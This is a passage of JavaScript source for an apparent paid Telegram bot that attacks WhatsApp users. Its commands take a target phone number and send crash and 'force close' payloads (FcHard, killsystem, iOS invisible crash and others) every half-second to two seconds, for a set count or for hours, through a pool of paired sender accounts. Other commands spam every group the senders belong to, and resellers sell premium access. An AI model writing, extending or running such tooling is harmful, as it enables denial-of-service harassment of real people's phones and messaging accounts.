    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = _senders[Math.floor(Math.random() * _senders.length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await FcHard.FcHard(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[killsystem only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await FcHard.FcHard(client, targetJid);
                } catch (err) {
                    console.log(`[force infinity time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['forceinfinity'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
    const _senders = getAvailableSenders(chatId, userId);
    if (!_senders || _senders.length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available.\n\n<b>Own:</b> use /reqpair to pair your number\n<b>SVIP/GroupPremium:</b> can use Global Senders automatically (no pair needed).\n\nTotal Global Senders: '+getGlobalSenders().length, {
            parse_mode: 'HTML'
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = _senders[Math.floor(Math.random() * _senders.length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await FcNew.FcNew(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[killsystem only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await FcNew.FcNew(client, targetJid);
                } catch (err) {
                    console.log(`[force infinity time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['delayinfinite'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
    const _senders = getAvailableSenders(chatId, userId);
    if (!_senders || _senders.length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available.\n\n<b>Own:</b> use /reqpair to pair your number\n<b>SVIP/GroupPremium:</b> can use Global Senders automatically (no pair needed).\n\nTotal Global Senders: '+getGlobalSenders().length, {
            parse_mode: 'HTML'
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = _senders[Math.floor(Math.random() * _senders.length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await CrashInfinity.crashnew(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[killsystem only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await CrashInfinity.crashnew(client, targetJid);
                } catch (err) {
                    console.log(`[delayinfinite time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['delayinfinity'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
    const _senders = getAvailableSenders(chatId, userId);
    if (!_senders || _senders.length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available.\n\n<b>Own:</b> use /reqpair to pair your number\n<b>SVIP/GroupPremium:</b> can use Global Senders automatically (no pair needed).\n\nTotal Global Senders: '+getGlobalSenders().length, {
            parse_mode: 'HTML'
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = _senders[Math.floor(Math.random() * _senders.length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await delayinfinityLogic.delayinfinity(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[killsystem only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await delayinfinityLogic.delayinfinity(client, targetJid);
                } catch (err) {
                    console.log(`[delayinfinity time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['Delayhard'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
    const _senders = getAvailableSenders(chatId, userId);
    if (!_senders || _senders.length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available.\n\n<b>Own:</b> use /reqpair to pair your number\n<b>SVIP/GroupPremium:</b> can use Global Senders automatically (no pair needed).\n\nTotal Global Senders: '+getGlobalSenders().length, {
            parse_mode: 'HTML'
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = _senders[Math.floor(Math.random() * _senders.length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await crashnoclickLogic.crashnoclick(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[killsystem only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await crashnoclickLogic.crashnoclick(client, targetJid);
                } catch (err) {
                    console.log(`[Delayhard time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});


SYLoVe(['Forcebeta', 'clickBeta'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
    const _senders = getAvailableSenders(chatId, userId);
    if (!_senders || _senders.length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available.\n\n<b>Own:</b> use /reqpair to pair your number\n<b>SVIP/GroupPremium:</b> can use Global Senders automatically (no pair needed).\n\nTotal Global Senders: '+getGlobalSenders().length, {
            parse_mode: 'HTML'
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = _senders[Math.floor(Math.random() * _senders.length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await killsystemLogic.killsystem(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[killsystem only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await killsystemLogic.killsystem(client, targetJid);
                } catch (err) {
                    console.log(`[killsystem time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe('forceclose', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
    const _senders = getAvailableSenders(chatId, userId);
    if (!_senders || _senders.length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available.\n\n<b>Own:</b> use /reqpair to pair your number\n<b>SVIP/GroupPremium:</b> can use Global Senders automatically (no pair needed).\n\nTotal Global Senders: '+getGlobalSenders().length, {
            parse_mode: 'HTML'
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = _senders[Math.floor(Math.random() * _senders.length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            for (let i = 0; i < count; i++) {
            
                await forceandroLogic.forceandro(client, targetJid);
                await forceandrov2Logic.forceandrov2(client, targetJid);
                await testlogic.forceclose(client, targetJid);
                await sleep(2000);
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            while (Date.now() < endTime) {
                await forceandroLogic.forceandro(client, targetJid);
                await forceandrov2Logic.forceandrov2(client, targetJid);
                await testlogic.forceclose(client, targetJid);
                await sleep(2000);
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['iosinvisible', 'ioshard'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
    const _senders = getAvailableSenders(chatId, userId);
    if (!_senders || _senders.length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available.\n\n<b>Own:</b> use /reqpair to pair your number\n<b>SVIP/GroupPremium:</b> can use Global Senders automatically (no pair needed).\n\nTotal Global Senders: '+getGlobalSenders().length, {
            parse_mode: 'HTML'
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: ${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = _senders[Math.floor(Math.random() * _senders.length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 500;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await IosVisible.IosVisible(client, targetJid);
                    await Ios.Ios(client, targetJid);
                    await IosInvisiblee.crash_invisivel_ios(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[IosInvisible only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await IosLogic.IosInvisible(client, targetJid);
                    await IosCrashLogic.IosCrashInvisible(client, targetJid);
                } catch (err) {
                    console.log(`[IosInvisible time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

        SYLoVe('broadcast', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (userId !== config.adminId && chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized, { parse_mode: 'HTML' });
            const broadcastText = msg.text.split(' ').slice(1).join(' ');
            if (!broadcastText) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Usage: /broadcast <your message>\n\nWill broadcast to all Telegram users via this bot.', { parse_mode: 'HTML' });
            }
            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No user database found.', { parse_mode: 'HTML' });
            }
            let users=[];
            try{ users = JSON.parse(fs.readFileSync(userFile)); }catch{ users=[]; }
            if(!Array.isArray(users) || users.length===0) return S7.sendMessage(chatId, 'No users to broadcast.', {parse_mode:'HTML'});
            let ok = 0, failed = 0;
            const statusMsg = await S7.sendMessage(chatId, `🚀 <b>Starting Telegram Broadcast...</b>\nTargeting: ${users.length} users.\nMode: ${msg.chat.type.includes('group')?'GROUP':'PRIVATE'}`, { parse_mode: 'HTML' });
            for (const user of users) {
                try {
                    const uid = user.id || user;
                    await S7.sendMessage(uid, `${broadcastText}`, { parse_mode: 'HTML' });
                    ok++;
                    await new Promise(resolve => setTimeout(resolve, 80)); 
                } catch (err) { failed++; }
            }
            S7.editMessageText(
                `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> <b>Broadcast Finished</b>\n\n` +
                `👤 <b>Total Users:</b> ${users.length}\n` +
                `✔️ <b>Successful:</b> ${ok}\n` +
                `❌ <b>Failed:</b> ${failed}`,
                { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'HTML' }
            );
        });
        // WA Broadcast via Global Senders (Group + Private support)

        SYLoVe(['bcgroup','bcallgroup','wabcall'], async (msg)=>{
            const chatId=msg.chat.id.toString();
            const userId=msg.from.id.toString();
            if(!LoveGlobalState(userId,chatId)) return sendSYLove(S7,chatId);
            const avail=getAvailableSenders(chatId,userId);
            if(!avail||avail.length===0) return S7.sendMessage(chatId, 'No WA Sender.',{parse_mode:'HTML'});
            const message=msg.text.split(' ').slice(1).join(' ');
            if(!message) return S7.sendMessage(chatId, 'Usage: /bcgroup <message> - broadcast to all groups of your senders');
            let sent=0;
            const status=await S7.sendMessage(chatId, `📢 Broadcasting to groups via ${avail.length} sender(s)...`,{parse_mode:'HTML'});
            for(const sess of avail){
                try{
                    const groups=await sess.sock.groupFetchAllParticipating();
                    for(const gid of Object.keys(groups)){
                        try{ await sess.sock.sendMessage(gid, {text: message}); sent++; await delay(600);}catch{}
                    }
                }catch{}
            }
            S7.editMessageText(`✅ Broadcast to ${sent} groups done.`,{chat_id:chatId, message_id:status.message_id, parse_mode:'HTML'});
        });
                
        SYLoVe('listprem', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    let dbChk = getDB();
    const isOwnerL = userId === config.adminId || chatId === config.adminId;
    const isResellerL = dbChk.resellers.includes(userId) || dbChk.resellers.includes(chatId);
    if (!isOwnerL && !isResellerL) return S7.sendMessage(chatId, notauthorized);
    if (!LoveGlobalState(userId, chatId)) {
        return sendSYLove(S7, chatId);
        }
    let db = getDB();
    if (db.premium.length === 0) {
        return S7.sendMessage(chatId, 'No premium users found.');
    }
    let SY_BE_MY_LOVE_YOUR_SABIR7718 = `⭐ <b>Premium List (${db.premium.length})</b>\n\n`;
    for (let i = 0; i < db.premium.length; i++) {
        const id = db.premium[i].toString();
        const exp = db.premiumExpiry[id] ? new Date(db.premiumExpiry[id]).toLocaleDateString('en-GB',{timeZone:'Asia/Jakarta'}) : 'Permanent';
        try {
            const user = await S7.getChat(id);
            const username = user.username ? `@${user.username} : ` : '';
            SY_BE_MY_LOVE_YOUR_SABIR7718 += `${i + 1}. ${username}<code>${id}</code> — ⏳ ${exp}\n`;
        } catch (e) {
            SY_BE_MY_LOVE_YOUR_SABIR7718 += `${i + 1}. <code>${id}</code> — ⏳ ${exp}\n`;
        }
    }
    SY_BE_MY_LOVE_YOUR_SABIR7718 += '\n──────────────────';
    S7.sendMessage(chatId, SY_BE_MY_LOVE_YOUR_SABIR7718, {
        parse_mode: 'HTML'
    });
});        
        SYLoVe('listgc', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();

    if (!LoveGlobalState(userId, chatId)) {
        return sendSYLove(S7, chatId);
    }
    const sessions = getAvailableSenders(chatId, userId);
    if (!sessions || sessions.length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No WhatsApp numbers available. SVIP/GroupPremium uses Global pool.', {
            parse_mode: 'HTML'
            });
    }

    let output = `⬣ <b>WHATSAPP GROUPS (${sessions.length} sender(s) ${canUseGlobal(userId)||isGroupPremium(chatId)?'GLOBAL':'OWN'})</b>\n\n`;
    let totalGroups = 0;
    let index = 1;

    for (const session of sessions) {
        const sock = session.sock;
        const num = session.num;

        try {
            const groupsObj = await sock.groupFetchAllParticipating();
            const groups = Object.values(groupsObj);

            if (groups.length === 0) continue;

            output += `📱 <b>Number:</b> <code>${num}</code>\n`;
            output += `━━━━━━━━━━━━━━━\n`;

            for (const group of groups) {
                const meta = await sock.groupMetadata(group.id);

                output += `❏ Group ${index++}\n`;
                output += `│⭔ <b>Name:</b> ${meta.subject || 'Unnamed'}\n`;
                output += `│⭔ <b>ID:</b> <code>${meta.id}</code>\n`;
                output += `│⭔ <b>Members:</b> ${(meta.participants && meta.participants.length) || 0}\n`;
                output += `╰──────────────\n\n`;

                totalGroups++;
            }
        } catch (err) {
            log('error', 'LISTGC', `Failed for ${num} (user ${chatId}): ${err.message}`);
            output += `⚠️ Failed to fetch groups for number ${num}: ${err.message}\n\n`;
        }
    }

    if (totalGroups === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No groups found on your connected numbers.', {
            parse_mode: 'HTML'            
            });
    }

    output = 
        `⬣ <b>WHATSAPP GROUPS (${totalGroups} total)</b>\n\n` +
        `📦 <b>Available senders:</b> ${sessions.length} (${canUseGlobal(userId)||isGroupPremium(chatId)?'GLOBAL':'OWN'}) | Total Global: ${getGlobalSenders().length}\n\n` +
        output;

    if (output.length > 4000) {
        const filePath = `./Love/listgc_${chatId}.txt`;
        fs.writeFileSync(filePath, output.replace(/<[^>]*>/g, ''));
        return S7.sendDocument(chatId, filePath, {
            caption: `📋 Full list of your WhatsApp groups (${totalGroups} groups)`
        });
    }

    S7.sendMessage(chatId, output, { parse_mode: 'HTML' });
});
        SYLoVe('state', (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');
    const value = args[1];
    if (userId !== config.adminId && chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized);
    if (!LoveGlobalState(userId, chatId)) {
        return sendSYLove(S7, chatId);
        }

    if (value !== '0' && value !== '1') {
        return S7.sendMessage(chatId, 'Usage: /state 0 | 1');
    }

    let db = getDB();
    db.state = Number(value);
    saveDB(db);

    S7.sendMessage(
        chatId,
        value === '0'
            ? '<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> State set to FREE MODE (All users allowed)'
            : '🔒 State set to PREMIUM ONLY MODE', {
            parse_mode: 'HTML'            
            }
    );
});


        SYLoVe('listuser', (msg) => {
        const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    if (!LoveGlobalState(userId, chatId)) {
        return sendSYLove(S7, chatId);
        }
            if (msg.chat.id.toString() !== config.adminId && msg.from.id.toString() !== config.adminId) {
                return S7.sendMessage(msg.chat.id, notauthorized);
            }

            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) return S7.sendMessage(msg.chat.id, 'No users found.');

            const users = JSON.parse(fs.readFileSync(userFile));
            let list = 'User List:\n\n';
            users.forEach((u, i) => {
                list += `${i + 1}. ${u.name} (${u.id})\n`;
            });

            if (list.length > 4000) {
                const listPath = path.join(LoveDir, 'list.txt');
                fs.writeFileSync(listPath, list);
                S7.sendDocument(msg.chat.id, listPath);
            } else {
                S7.sendMessage(msg.chat.id, list);
            }
      });

                S7.on('callback_query', async (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            const data = query.data;
            const userId = query.from.id;
            const name = query.from.username ? `@${query.from.username}` : query.from.first_name;
    const uptime = getRuntime();
    const love = userId.toString();
            const S7edit = async (text, opts) => {
        try {
            await S7.editMessageCaption(text, opts);
        } catch (captionErr) {
            try {
                await S7.editMessageText(text, opts);
            } catch (textErr) {
                if (!textErr.message.includes('message is not modified')) {
                    log('error', 'SYSTEM', textErr.message);
                }
            }
        }
    };
    S7.answerCallbackQuery(query.id).catch(() => {});
            if (data === 'check_membership') {
                const isMember = await CheckSYlovesToo(S7, userId, botConfig.channelId, botConfig.groupId, botOwnerId);

                if (isMember) {
                    S7.deleteMessage(chatId, messageId).catch(() => {});
                    S7.sendMessage(chatId, 
